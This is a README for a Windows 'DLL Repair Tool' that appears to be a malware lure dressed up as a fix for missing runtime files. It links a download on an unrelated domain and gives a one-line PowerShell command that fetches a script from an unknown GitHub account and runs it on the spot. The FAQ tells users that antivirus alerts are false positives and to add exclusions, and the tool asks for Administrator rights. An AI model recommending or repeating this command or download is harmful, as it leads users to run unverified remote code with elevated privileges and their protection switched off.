<div align="center">

<img src="https://img.shields.io/badge/DLL_Repair_Tool-v2.1.0-2ea44f?style=for-the-badge" alt="DLL Repair Tool">

# DLL Repair Tool

**Fix missing and corrupted DLL errors on Windows 10 / 11 in one click.**

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Arch](https://img.shields.io/badge/Arch-x64%20%7C%20x86-blue?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
[![Release](https://img.shields.io/badge/Release-2.1.0-brightgreen?style=flat-square)]()

<br>

[![Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F_Download-Latest_Release-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://dll.nexustool.fun/)

</div>

---

## About

**DLL Repair Tool** scans your system for missing or corrupted DLL files and fixes them automatically. It installs all required **Visual C++ Redistributable** packages, **DirectX** runtime components, **.NET Framework** dependencies, and **Universal CRT** libraries in a single operation.

Instead of manually downloading each DLL or runtime package from different sources, run this tool once and every DLL error is resolved.

### Alternative install — PowerShell

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Features

- **One-Click Repair** — Scan and fix every DLL error automatically
- **Visual C++ Pack** — All VC++ Redistributable versions (2005 through 2022), both x86 and x64
- **DirectX Runtime** — Complete DirectX End-User Runtime (d3dx9, d3dx10, d3dx11, xinput, X3DAudio)
- **System File Repair** — SFC and DISM integration to restore corrupted Windows files
- **.NET Framework** — Installs missing .NET 4.8.1 and .NET Desktop Runtime 8.0
- **Universal CRT** — Fixes api-ms-win-crt-\* errors
- **Restore Point** — Creates a system restore point before any changes
- **Portable** — No installation required, runs from any folder
- **Silent Mode** — Command-line option for unattended repair

---

## Supported Errors

### Visual C++ Runtime

| Error Message | Runtime Package |
|---|---|
| `MSVCP140.dll is missing` | Visual C++ 2015-2022 Redistributable |
| `VCRUNTIME140.dll not found` | Visual C++ 2015-2022 Redistributable |
| `VCRUNTIME140_1.dll is missing` | Visual C++ 2015-2022 Redistributable |
| `MSVCP120.dll is missing` | Visual C++ 2013 Redistributable |
| `MSVCR120.dll not found` | Visual C++ 2013 Redistributable |
| `MSVCP110.dll is missing` | Visual C++ 2012 Redistributable |
| `MSVCR110.dll not found` | Visual C++ 2012 Redistributable |
| `MSVCP100.dll is missing` | Visual C++ 2010 Redistributable |
| `MSVCR100.dll not found` | Visual C++ 2010 Redistributable |
| `MSVCR90.dll is missing` | Visual C++ 2008 Redistributable |
| `MSVCR80.dll not found` | Visual C++ 2005 Redistributable |
| `MSVCR71.dll is missing` | Visual C++ 2003 Runtime |
| `concrt140.dll is missing` | VC++ Concurrency Runtime |
| `vcomp140.dll not found` | VC++ OpenMP Runtime |
| `mfc140u.dll is missing` | VC++ MFC Library |
| `vccorlib140.dll not found` | VC++ Core Library |
| `MSVCP90.dll is missing` | Visual C++ 2008 Redistributable |
| `MSVCP80.dll not found` | Visual C++ 2005 Redistributable |
| `MSVCP71.dll is missing` | Visual C++ 2003 Runtime |
| `msvcp140_1.dll is missing` | Visual C++ 2015-2022 (extended) |
| `msvcp140_2.dll not found` | Visual C++ 2015-2022 (extended) |
| `msvcp140_atomic_wait.dll is missing` | Visual C++ 2015-2022 (atomic) |
| `msvcp140_codecvt_ids.dll not found` | Visual C++ 2015-2022 (codecvt) |

### DirectX

| Error Message | Component |
|---|---|
| `d3dx9_43.dll is missing` | DirectX 9 Runtime |
| `d3dx9_42.dll not found` | DirectX 9 Runtime |
| `d3dx9_41.dll is missing` | DirectX 9 Runtime |
| `d3dx9_39.dll not found` | DirectX 9 Runtime |
| `d3dx9_35.dll is missing` | DirectX 9 Runtime |
| `d3dx11_43.dll is missing` | DirectX 11 Runtime |
| `d3dcompiler_47.dll not found` | DirectX Shader Compiler |
| `d3dcompiler_43.dll is missing` | DirectX Shader Compiler |
| `xinput1_3.dll is missing` | DirectX Input |
| `xinput1_4.dll not found` | DirectX Input |
| `X3DAudio1_7.dll is missing` | DirectX Audio |
| `XAPOFX1_5.dll not found` | DirectX Audio Effects |
| `XAudio2_7.dll is missing` | DirectX XAudio |

### Universal C Runtime

| Error Message | Component |
|---|---|
| `api-ms-win-crt-runtime-l1-1-0.dll` | Universal CRT |
| `api-ms-win-crt-heap-l1-1-0.dll` | Universal CRT |
| `api-ms-win-crt-stdio-l1-1-0.dll` | Universal CRT |
| `api-ms-win-crt-math-l1-1-0.dll` | Universal CRT |
| `ucrtbase.dll not found` | Universal CRT Base |

### .NET

| Error Message | Component |
|---|---|
| `hostfxr.dll not found` | .NET Runtime Host |
| `clrjit.dll is missing` | .NET JIT Compiler |

---

## Preview

```
  ┌──────────────────────────────────────────────────┐
  │              DLL Repair Tool v2.1                │
  ├──────────────────────────────────────────────────┤
  │                                                  │
  │   System Scan Results             3 issues found │
  │                                                  │
  │   [!] VCRUNTIME140.dll          — Missing        │
  │   [!] MSVCP140.dll              — Missing        │
  │   [!] d3dx9_43.dll              — Missing        │
  │   [✓] xinput1_4.dll             — OK             │
  │   [✓] d3dcompiler_47.dll        — OK             │
  │   [✓] ucrtbase.dll              — OK             │
  │                                                  │
  │   [ Repair All ]   [ Scan Again ]   [ Exit ]     │
  │                                                  │
  └──────────────────────────────────────────────────┘
```

---

## How It Works

1. **Scan** — Checks system directories and registry for missing DLL references
2. **Identify** — Determines which runtime packages are needed
3. **Download** — Fetches official Microsoft redistributable packages
4. **Install** — Silently installs all required components (x86 + x64)
5. **Verify** — Re-scans to confirm all errors are resolved

---

## System Requirements

| Component | Requirement |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Disk Space | 500 MB for runtime packages |
| Network | Internet connection for downloads |
| Privileges | Administrator |

---

## Games & Software Fixed

DLL errors frequently affect:

**Games** — GTA V, Red Dead Redemption 2, Elden Ring, Cyberpunk 2077, Hogwarts Legacy, Baldur's Gate 3, Fortnite, Valorant, CS2, Deadlock, Palworld, Call of Duty, The Witcher 3, Starfield, Resident Evil 4, FIFA / EA FC 25

**Software** — Adobe Creative Suite, Autodesk, Blender, OBS Studio, DaVinci Resolve, Unity, Unreal Engine, Visual Studio, MATLAB

---

## FAQ

**Is this safe?**
Yes. The tool downloads official Microsoft packages from Microsoft servers and installs them using standard Windows installer methods.

**My antivirus flagged it.**
Some antivirus programs flag unfamiliar executables. This is a false positive. You can add an exclusion or verify the file hash in the release notes.

**Do I need to restart?**
Recommended after repair, but most fixes take effect immediately.

**It says "access denied".**
Run the tool as Administrator (right-click → Run as administrator).

**My game still crashes after repair.**
DLL errors are only one possible cause. If crashes persist, update your GPU drivers and verify game file integrity through Steam/Epic.

---

## License

[MIT](LICENSE) — free for personal and commercial use.
